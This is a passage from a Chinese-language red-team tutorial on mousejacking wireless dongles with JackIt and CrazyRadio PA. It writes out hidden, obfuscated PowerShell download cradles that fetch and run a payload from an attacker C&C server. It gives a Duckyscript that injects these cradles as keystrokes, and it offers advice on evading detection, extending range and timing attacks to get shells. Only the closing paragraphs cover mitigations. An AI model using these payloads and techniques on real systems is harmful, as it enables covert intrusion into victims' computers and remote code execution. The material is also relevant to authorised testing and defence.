    powershell.exe -nop -w hidden -c $v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://192.168.2.10/a');
并不像一个普通的PowerShell下载cradle，不是么？该模块会生成一个随机变量（在本示例中为$
v），并使用它帮助混淆cradle，从而绕过某些防御措施。此外，这些命令可以使cradle看起来像是使用了代理，这将有助于攻击载荷成功在互联网上放出（如果你的C&C服务器服务器基于云服务，可能会起到帮助）。
我们完全能够在缩短攻击载荷字符串的情况下，仍然使其具备功效，但我们必须权衡其中利弊。如果我们的C&C服务器就存在于目标网络内部，可以删除与代理相关的命令，同时继续保留一些混淆代码以保护cradle完整性。再或者，如果我们真的需要最短的字符串，可以去掉所有的混淆代码，恢复其成为正常的下载cradle。所有的这些最终归结于，你是选择防止用户察觉，还是躲避对方主机的防护措施。以下是每种修改方法的示例：
    powershell.exe -nop -w hidden -c $v=new-object net.webclient;IEX $v.downloadstring('http://192.168.2.10/a');
    powershell.exe -nop -w hidden -c IEX(new-object net.webclient).downloadstring('http://192.168.2.10/a');
专业提示：如果你对PowerShell混淆技术感兴趣，请关注@danielhbohannon的文章！
现在，我们已经建立好C&C服务器，并安放完恶意字符串。我们可以在之前阶段修改模板中的Duckyscript，只需确认做好本地备份：
    GUI r
    DELAY 300
    STRING powershell.exe -nop -w hidden -c IEX(new-object net.webclient).downloadstring('http://192.168.2.10/a');
    DELAY 300
    ENTER
    ENTER
使用JackIt进行漏洞利用或是监视，只需以下代码标签调用Duckyscript文件：
    /opt/jackit/$ ./jackit.py --script ducky-script.txt
在下面的截图中，可以看到我们发现了两个经由JackIt指纹识别的无线外设。当我们需要启动鼠标劫持攻击时，只需按下CTRL-C：
我们可以选择单独的设备，或者多个设备，再或者被发现的所有设备。一旦我们选择完毕并按下ENTER键，定向攻击便会启动。根据目标设备的品牌，你将在脚本运行完成之前，从屏幕上看到很多延迟10ms的消息。当看到以下消息时，你就能得知JackIt已经运行完成：[+]已完成所有攻击。
让我们来查看一下Web Delivery模块，看看是否有攻击取得成功：
看起来我们实现了一次成功攻击！虽然我们尝试对两个目标发动鼠标劫持攻击，但只有一个成功响应。之所以其中一个攻击尝试会取得失败，我们会简要讨论造成原因。
现在，我们已经成功结合Metasploit的Web
Delivery模块与JackIt入侵一处无线外设。我们实际上还有其他框架可以利用，制作类似的单行PowerShell，包括[Cobalt
Strike](https://www.cobaltstrike.com/)和[Empire](https://www.powershellempire.com/)。可以简单讲一讲Cobalt
Strike，我在进行鼠标劫持时，还喜欢使用一种非PowerShell的攻击载荷。
Cobalt Strike有一个名为[Scripted Web Delivery](https://www.cobaltstrike.com/help-scripted-web-delivery)的攻击手法，与 Metasploit的Web
Delivery相类似，不同之处在于其提供了更多的攻击载荷选项。虽然PowerShell选项已经证明可用，我还是更偏爱 **regsvr32**
攻击荷载，因为它十分短小而实用；但是，这种攻击必须目标系统安装Microsoft Office，因为发动攻击需要使用VBA宏命令以及COM脚本段：
配置完成后，攻击载荷将类似于如下内容：
本文中并未叙述该攻击载荷的运行原理，如果有兴趣了解，可以查看凯西•史密斯（[@subTee](https://twitter.com/subtee)）的[博客文章](http://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html)。
继续之前，我想提一下：在成功实施攻击之后，我在再次运行JackIt时出现了问题，收到了如下错误消息：
我分别以在VMWare下运行Kali，以及单独运行Kali
box两种情况重现了这个错误。如果你在其他类型的Linux上遇到此情况，请告知我。除了重新启动操作系统之外，解决此错误的唯一方法是取消绑定，然后重新将USB驱动程序和CrazyRadio
PA加密狗绑定。我们可以通过拔下并重新插入CrazyRadio PA，或者通过向控制台发送一些特定的命令来实现。幸运的是，我的同事Dan
Astor（@illegitimateDA）编写了一个Bash脚本为我们代劳。每当提示错误消息，只需运行以下脚本，然后就可以重新运行JackIt：
    #!/bin/bash
    #Tool :: USB device reset script developed for use with JackIt & CrazyRadio PA USB Adapter
    #Author :: Dan Astor (@illegitimateDA)
    #Usage :: After running an attack with JackIt, run the script to reset the USB adapter. This will fix the USB Core Error Python throws.
    #Unbind USB devices from the system and rebind them
    for device in /sys/bus/pci/drivers/uhci_hcd/*:*; do
         #Unbind the device
         echo "${device##*/}" > "${device%/*}/unbind"
         #Bind the device
         echo "${device##*/}" > "${device%/*}/bind"
    done
**我被告知会出现Shells**
****
至此，我们发现并攻击了豪不知情的受害者，他们不知道加密狗的危险。但是，如果一切都不按计划运行呢？如果我们对多个外设释放攻击后，发现并没有shells在等着我们呢？很可怕！
首先：我们要讨论区域范围。坦白的说，[CrazyRadio
PA](https://www.amazon.com/gp/product/B00VYA3A2U/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=B00VYA3A2U&linkCode=as2&tag=jrenard-20&linkId=f5ebfa29c33f2e99d2a8ff0c2c30c79b)附带的天线并不好用，尽管广告中吹嘘加密狗可以“远距离”进行操控。在我们的攻击字符串中，仅出现一次代码缺失或乱码情况，影响到了pwnage
parade。我不止一次看到代码缺失的情况，甚至目睹了超长字符串的运行实例，充斥着正斜杠以阻止实例关闭，用户因此不得不重启受影响计算机。这些情况是不理想的，因为我们没有收到shells，而用户可能会注意到我们的攻击，我们甚至还会对用户的外设灵敏度产生负面影响（CLIENT
RAGE！）。根据我的经验，我觉得很多这些问题都可以利用提高信号强度来避免。我有幸得到了Alfa天线，如[9dBi Wifi
Booster](https://www.amazon.com/gp/product/B002MUU6L4/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=B002MUU6L4&linkCode=as2&tag=jrenard-20&linkId=89e83d10c3ced0f7e5ca958b94d15383)。这个特殊选择的唯一问题是，我们需要在笔记本电脑的延伸出的一个15“天线上花费大量精力调试。我的建议是：尝试不同的选择，找到一个你认为可靠的最大范围。
第二件要注意的事情是：微软的无线设备并不好惹。这是因为，与罗技外设不同，微软在设备和加密狗之间的每次通信中都使用了序列号。
JackIt能够用于监视这些序列号，但如果用户在受攻击之前执行某些操作（单击，移动鼠标等），则序列号将无法对齐，然后我们将再次发现代码缺失或乱码。虽然有时候很难搞定，但在目标使用微软外设时，我更愿意亲自“监视”目标，以等待发动攻击的理想时机。当然如果我完全无视这些条件，并将微软和罗技设备都摆在攻击范围之内，我还是会选择罗技设备作为目标。
第三个考虑是：我们应该如何构建指向我们攻击载荷的URL。我在最近的实践中吸取了教训。利用Cobalt Strike，我在一个类似于本文之前提到的URL示例（
**http://ip_address/a** ）中安放了攻击荷载。在对一个理想目标发起攻击后，我发现在C&C服务器上等待不到shell。在检查Cobalt
Strike的Web日志后，我看到类似于以下内容的消息：
这是令人困惑的地方，为什么我的目标会登录以大写/
A结尾的网址？在我的DuckyScript文件中有没有错误的攻击字符串？经过快速检查，我排除了这种可能。然后，我突然想到…用户可能启用了大小写键！我居然犯了这么蠢的错误！从那以后，我更改了鼠标劫持所用的URL为数字（即/
1），防止再次出现类似的问题。
最后，我列举了一些用户能够采取的补救措施。
**质量不好的加密狗有什么特点？**
****
处理鼠标劫持问题，最简单的解决方案其实是：使用有线外设（或改为蓝牙设备）。话虽如此，如果你真的钟爱2.4
GHz设备，微软和罗技还是在受影响的产品中制定了一些缓解策略的。
微软于2016年4月发布了一项安全通告，并附有相应的可选补丁。
该补丁将在加密狗端口添加更强大的过滤手段，以便检测和处理恶意键盘操作。研究人员已经测试过该补丁的效果，但表示补丁不一定能解决所有问题，某些设备即使在安装补丁后仍然易受攻击。
罗技采取了不同的策略，其要求用户手动进行固件更新，以解决问题。
更新过程需要多个步骤，对于专业技术掌握较少的终端用户来说十分麻烦。对于IT部门，想要面向所有用户群体进行大规模手动升级也是不切实际的。
鉴于这些事实，我认为在未来一段时间内，还是能够在企业内部发现能够实施鼠标劫持攻击的设备。
如果你也想进行相关实践，请考虑将鼠标劫持添加到自己的攻击工具箱中吧！